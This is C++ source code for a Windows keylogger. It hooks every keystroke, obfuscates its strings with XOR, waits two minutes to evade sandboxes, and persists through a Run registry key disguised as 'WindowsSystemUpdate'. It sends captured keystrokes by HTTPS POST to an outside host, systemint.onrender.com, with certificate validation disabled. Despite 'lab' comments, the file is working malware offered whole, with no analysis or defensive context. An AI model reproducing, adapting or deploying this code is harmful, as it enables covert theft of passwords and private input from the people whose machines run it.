#include <windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <array>

#pragma comment(lib, "winhttp.lib")

// --- 1. COMPILE-TIME STRING ENCRYPTION ---
template <size_t N>
class XorStr {
    std::array<char, N> _data;
public:
    constexpr XorStr(const char* str) : _data{} {
        for (size_t i = 0; i < N; ++i) _data[i] = str[i] ^ 0x57; 
    }
    std::string decrypt() const {
        std::string out;
        for (size_t i = 0; i < N; ++i) out += _data[i] ^ 0x57;
        return out;
    }
};
#define X(str) XorStr<sizeof(str)>(str).decrypt().c_str()

// --- 2. INDIRECT SYSCALL GLOBALS ---
extern "C" {
    DWORD sys_number;
    ULONG_PTR sys_addr;
    NTSTATUS DoIndirectSyscall(HANDLE h, PVOID* base, PSIZE_T size, ULONG newProt, PULONG oldProt);
}

// --- 3. THE KEYLOGGER & UPLOAD LOGIC ---
HHOOK hKeyHook = NULL;
std::string logBuffer = "";

void UploadData(std::string data) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;

    // FORCE TLS 1.2/1.3 for Render.com
    DWORD dwProto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwProto, sizeof(dwProto));

    std::string rawUrl = X("systemint.onrender.com");
    std::wstring wideUrl(rawUrl.begin(), rawUrl.end());
    HINTERNET hConnect = WinHttpConnect(hSession, wideUrl.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/sync", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    // Lab Evasion: Ignore SSL certificate errors
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    std::string json = "{\"type\":\"Keylogger\", \"data\":\"" + data + "\"}";
    LPCWSTR header = L"Content-Type: application/json\r\n";
    
    WinHttpSendRequest(hRequest, header, (DWORD)-1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
        if ((k->vkCode >= 0x30 && k->vkCode <= 0x39) || (k->vkCode >= 0x41 && k->vkCode <= 0x5A)) {
            logBuffer += (char)k->vkCode;
        }
        if (k->vkCode == VK_SPACE) logBuffer += " ";
        if (k->vkCode == VK_RETURN && !logBuffer.empty()) {
            UploadData(logBuffer);
            logBuffer.clear();
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

// --- 4. MAIN ENTRY ---
int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int nS) {
    // Stage 1: Sandbox Evasion - Wait 2 minutes (120,000 ms)
    Sleep(120000); 

    // Stage 2: Verify Connection
    UploadData("LAB_CONNECTION_ESTABLISHED");

    // Stage 3: Setup persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, X("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, X("WindowsSystemUpdate"), 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path));
        RegCloseKey(hKey);
    }

    // Stage 4: Begin Monitoring
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
